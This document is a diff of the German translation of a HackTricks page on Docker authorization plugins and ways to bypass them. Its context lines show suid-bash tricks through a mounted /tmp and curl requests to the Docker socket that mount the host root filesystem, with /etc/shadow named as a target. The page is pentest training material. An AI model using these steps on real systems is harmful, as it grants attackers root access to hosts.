@@ -1,6 +1,6 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Das** Standard-**Autorisierungs**modell von **Docker** ist **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-**Befehle** ausführen. Das Gleiche gilt für Aufrufer, die die Docker-Engine-API verwenden, um den Daemon zu kontaktieren. Wenn Sie **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungs-Plugins** erstellen und diese zu Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungs-Plugin kann ein Docker-Administrator **feingranulare Zugriffs**richtlinien zur Verwaltung des Zugriffs auf den Docker-Daemon **konfigurieren**.
+**Docker**'s standard **Autorisierungs**modell ist **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-**Befehle** ausführen. Das Gleiche gilt für Aufrufer, die die Docker-Engine-API verwenden, um den Daemon zu kontaktieren. Wenn Sie **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungs-Plugins** erstellen und diese zu Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungs-Plugin kann ein Docker-Administrator **feingranulare Zugriffs**richtlinien zur Verwaltung des Zugriffs auf den Docker-Daemon **konfigurieren**.
 
 # Grundarchitektur
 
@@ -24,7 +24,7 @@ Während der Verarbeitung von Anfrage/Aantwort müssen einige Autorisierungsflü
 
 ## Mehrere Plugins
 
-Sie sind verantwortlich für die **Registrierung** Ihres **Plugins** als Teil des **Starts** des Docker-Daemons. Sie können **mehrere Plugins installieren und sie miteinander verketten**. Diese Kette kann geordnet sein. Jede Anfrage an den Daemon durchläuft die Kette in der Reihenfolge. Nur wenn **alle Plugins den Zugriff** auf die Ressource gewähren, wird der Zugriff gewährt.
+Sie sind verantwortlich für die **Registrierung** Ihres **Plugins** als Teil des Docker-Daemon-**Starts**. Sie können **mehrere Plugins installieren und sie miteinander verketten**. Diese Kette kann geordnet sein. Jede Anfrage an den Daemon durchläuft die Kette in der Reihenfolge. Nur wenn **alle Plugins den Zugriff** auf die Ressource gewähren, wird der Zugriff gewährt.
 
 # Plugin-Beispiele
 
@@ -80,7 +80,7 @@ Jetzt kann der Benutzer den Container mit einer der [**zuvor besprochenen Techni
 
 ## Schreibbares Verzeichnis einbinden
 
-In diesem Fall **verbot der Systemadministrator den Benutzern, Container mit dem `--privileged`-Flag auszuführen** oder dem Container zusätzliche Berechtigungen zu geben, und er erlaubte nur das Einbinden des Verzeichnisses `/tmp`:
+In diesem Fall **verbot der Sysadmin den Benutzern, Container mit dem `--privileged`-Flag auszuführen** oder dem Container zusätzliche Berechtigungen zu geben, und er erlaubte nur das Einbinden des Verzeichnisses `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -94,7 +94,7 @@ host> /tmp/bash
 >
 > **Beachten Sie, dass nicht alle Verzeichnisse auf einer Linux-Maschine das suid-Bit unterstützen!** Um zu überprüfen, welche Verzeichnisse das suid-Bit unterstützen, führen Sie `mount | grep -v "nosuid"` aus. Zum Beispiel unterstützen normalerweise `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` und `/var/lib/lxcfs` das suid-Bit nicht.
 >
-> Beachten Sie auch, dass Sie, wenn Sie **/etc** oder einen anderen Ordner **mit Konfigurationsdateien** **einbinden** können, diese als Root im Docker-Container ändern können, um sie **auf dem Host auszunutzen** und Privilegien zu eskalieren (möglicherweise durch Modifikation von `/etc/shadow`).
+> Beachten Sie auch, dass Sie, wenn Sie **/etc** oder einen anderen Ordner **mit Konfigurationsdateien** **einbinden** können, diese als Root aus dem Docker-Container ändern können, um sie **auf dem Host auszunutzen** und Privilegien zu eskalieren (möglicherweise durch Modifikation von `/etc/shadow`).
 
 ## Unchecked API Endpoint
 
@@ -107,7 +107,7 @@ Sie können die Docker-API unter [https://docs.docker.com/engine/api/v1.40/#](ht
 ### Binds in root
 
 Es ist möglich, dass der Sysadmin beim Konfigurieren der Docker-Firewall **ein wichtiges Parameter** der [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) wie "**Binds**" **vergessen hat**.\
-Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container zu erstellen und auszuführen, der das Root-Verzeichnis (/) des Hosts einbindet:
+Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container zu erstellen und auszuführen, der das Root-Verzeichnis (/) des Hosts einhängt:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -126,9 +126,9 @@ Befolgen Sie die gleichen Anweisungen wie bei **Binds in root**, indem Sie diese
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Mounts im Root
+### Mounts in root
 
-Befolgen Sie die gleichen Anweisungen wie bei **Binds im Root** und führen Sie diese **Anfrage** an die Docker API aus:
+Befolgen Sie die gleichen Anweisungen wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
